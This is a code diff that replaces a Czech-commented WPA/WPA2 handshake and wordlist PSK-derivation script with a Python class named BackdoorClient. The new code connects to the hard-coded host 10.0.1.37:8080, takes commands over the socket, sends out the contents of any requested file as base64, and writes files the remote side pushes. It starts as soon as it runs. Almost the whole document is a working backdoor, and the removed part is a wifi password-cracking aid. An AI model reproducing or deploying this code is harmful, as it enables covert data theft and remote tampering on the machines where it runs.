@@ -1,73 +1,50 @@
-import pyshark
-import hashlib
-import argparse
+import socket
+import base64
+import simplejson
 
-def extract_handshake_data(pcap_file):
-    """ Extrahuje potřebná data z pcap nebo cap souboru """
-    cap = pyshark.FileCapture(pcap_file, display_filter='eapol')
-    
-    eapol_packets = []
-    client_mac = None
-    ap_mac = None
-    anonce = None
-    snonce = None
-    
-    # Extrahujeme pakety EAPOL
-    for packet in cap:
-        if 'eapol' in packet:
-            eapol_packets.append(packet)
-            # Identifikace MAC adresy
-            if packet.eapol.src == '00:00:00:00:00:00':  # Typická MAC adresa AP
-                ap_mac = packet.eapol.src
-            else:
-                client_mac = packet.eapol.src
-            
-            # Získání ANonce a SNonce
-            if 'anonce' in packet.eapol.field_names:
-                anonce = packet.eapol.anonce
-            if 'snonce' in packet.eapol.field_names:
-                snonce = packet.eapol.snonce
-                
-    return client_mac, ap_mac, eapol_packets, anonce, snonce
+class BackdoorClient:
+    def __init__(self, ip, port):
+        self.my_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.my_connection.connect((ip, port))
 
-def derive_psk(ssid, password):
-    """ Derivace PSK pomocí PBKDF2-HMAC-SHA1 """
-    ssid = ssid.encode('utf-8')
-    password = password.encode('utf-8')
-    
-    # Derivace PSK z password a SSID
-    psk = hashlib.pbkdf2_hmac('sha1', password, ssid, 4096, dklen=32)
-    return psk
+    def json_send(self, data):
+        json_data = simplejson.dumps(data)
+        self.my_connection.send(json_data.encode("utf-8"))
 
-def main():
-    parser = argparse.ArgumentParser(description="Extrahuj data z WPA/WPA2 handshaku a derivuj PSK.")
-    parser.add_argument('-P', '--wordlist', help="Cesta k wordlist souboru pro PSK derivaci", required=True)
-    parser.add_argument('capture', help="PCAP nebo CAP soubor", type=str)
-    parser.add_argument('ssid', help="SSID cílové sítě", type=str)
-    
-    args = parser.parse_args()
-    
-    # Extrahování dat z pcap souboru
-    client_mac, ap_mac, eapol_packets, anonce, snonce = extract_handshake_data(args.capture)
-    
-    if client_mac and ap_mac:
-        print(f"Client MAC: {client_mac}")
-        print(f"AP MAC: {ap_mac}")
-        print(f"ANonce: {anonce}")
-        print(f"SNonce: {snonce}")
-    else:
-        print("Chybí potřebná data v pcap souboru.")
-        return
-    
-    # Nyní načteme wordlist pro PSK derivaci
-    with open(args.wordlist, 'r') as wordlist_file:
-        for line in wordlist_file:
-            password = line.strip()
-            print(f"Testování hesla: {password}")
-            
-            # Derivace PSK pro každý password v wordlistu
-            psk = derive_psk(args.ssid, password)
-            print(f"Derivovaný PSK: {psk.hex()}")
+    def json_receive(self):
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data + self.my_connection.recv(1024).decode()
+                return simplejson.loads(json_data)
+            except ValueError:
+                continue
 
-if __name__ == "__main__":
-    main()
+    def get_file_contents(self, path):
+        with open(path, "rb") as my_file:
+            return base64.b64encode(my_file.read())
+
+    def save_file(self, path, content):
+        with open(path, "wb") as my_file:
+            my_file.write(base64.b64decode(content))
+            return "Download OK"
+
+    def start_socket(self):
+        while True:
+            command = self.json_receive()
+            try:
+                if command[0] == "quit":
+                    self.my_connection.close()
+                    exit()
+                elif command[0] == "download":
+                    command_output = self.get_file_contents(command[1])
+                elif command[0] == "upload":
+                    command_output = self.save_file(command[1], command[2])
+                else:
+                    command_output = "Unsupported Command"
+            except Exception:
+                command_output = "Error!"
+            self.json_send(command_output)
+
+backdoorclient = BackdoorClient("10.0.1.37", 8080)
+backdoorclient.start_socket()
